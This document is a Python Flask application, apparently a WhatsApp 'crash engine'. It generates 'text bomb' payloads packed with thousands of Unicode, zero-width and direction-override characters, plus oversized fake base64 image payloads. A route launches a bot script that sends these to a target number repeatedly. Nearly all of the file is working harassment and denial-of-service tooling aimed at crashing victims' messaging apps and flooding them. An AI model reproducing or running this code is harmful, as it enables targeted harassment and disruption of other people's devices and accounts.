# app.py
# Jalankan: python app.py
# Buka: http://localhost:5000

from flask import Flask, render_template, request, jsonify
import subprocess
import threading
import time
import random
import string
import os

app = Flask(__name__)

# ==================== GENERATOR FUNCTIONS ====================

def generate_text_bomb(message, intensity='heavy'):
    """Generate text bomb payload pake Python"""
    unicode_chars = [
        "࿕", "࿖", "࿗", "࿘", "𓃠", "𓃗", "𓃥", "𓆙", "𓆈", "𓅓",
        "҉", "҈", "҉", "Ҋ", "ҋ", "Ҍ", "ҍ", "Ҏ", "ҏ", "ঋ", "ঌ", "এ",
        "🤯", "💀", "👾", "👽", "💩", "🤖", "🎃", "😈", "👹", "👺",
        "\u202E", "\u202D", "\u200F", "\u200E", "\u061C", "\u200D"
    ]
    
    repeat_count = {
        'light': 500,
        'heavy': 2000,
        'nuke': 5000
    }.get(intensity, 2000)
    
    payload = message + " "
    
    for i in range(repeat_count):
        payload += random.choice(unicode_chars)
        
        if i % 10 == 0:
            payload += "\u200D" * 25
        if i % 30 == 0:
            payload += "𒐫" * 40
        if i % 70 == 0:
            payload += "\n" + "█" * 200 + "\n"
    
    payload += "\n\n" + "⬛⬜" * 100 + "\n"
    payload += f"[ REU GENERATED - {repeat_count}x SPAM ]"
    
    return payload

def generate_image_bomb(message, size_kb=2000):
    """Generate fake image base64 pake Python"""
    header = "data:image/png;base64,"
    
    # Target size in bytes
    target_bytes = size_kb * 1024
    
    # Base64 characters
    chars = string.ascii_letters + string.digits + '+/'
    
    # Calculate needed random chars
    needed = int((target_bytes - len(header)) * 4/3)
    
    # Generate random base64
    random_part = ''.join(random.choice(chars) for _ in range(needed))
    
    # Sisipin message biar ada "isi"
    message_b64 = base64.b64encode(message.encode()).decode()
    
    # Sisipin di beberapa tempat
    random_list = list(random_part)
    for i in range(0, len(random_list), 10000):
        if i + len(message_b64) < len(random_list):
            random_list[i:i+len(message_b64)] = message_b64
    
    random_part = ''.join(random_list)
    
    return header + random_part

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Render halaman utama"""
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    """API untuk generate payload"""
    data = request.json
    mode = data.get('mode', 'text')
    message = data.get('message', '⬛⬜ CRASH ⬜⬛')
    intensity = data.get('intensity', 'heavy')
    size = data.get('size', 2000)
    
    try:
        if mode == 'text':
            payload = generate_text_bomb(message, intensity)
            return jsonify({
                'success': True,
                'payload': payload,
                'size': f"{len(payload)/1024:.2f} KB",
                'chars': len(payload)
            })
        elif mode == 'image':
            payload = generate_image_bomb(message, size)
            return jsonify({
                'success': True,
                'payload': payload,
                'size': f"{len(payload)/1024:.2f} KB",
                'chars': len(payload)
            })
        else:
            return jsonify({'success': False, 'error': 'Mode tidak dikenal'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/run_bot', methods=['POST'])
def run_bot():
    """Jalankan bot WA terpisah"""
    data = request.json
    target = data.get('target', '')
    message = data.get('message', '')
    repeat = data.get('repeat', 10)
    
    try:
        # Panggil wa_bot.py sebagai subprocess
        cmd = ['python', 'wa_bot.py', '--target', target, '--message', message, '--repeat', str(repeat)]
        
        # Jalanin di background biar gak ngeblock
        def run_in_background():
            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        thread = threading.Thread(target=run_in_background)
        thread.start()
        
        return jsonify({'success': True, 'message': 'Bot started in background'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════╗
    ║   REU WA CRASH ENGINE - FLASK        ║
    ║   Running on http://localhost:5000   ║
    ║   Press Ctrl+C to stop               ║
    ╚══════════════════════════════════════╝
    """)
    app.run(debug=True, host='0.0.0.0', port=5000)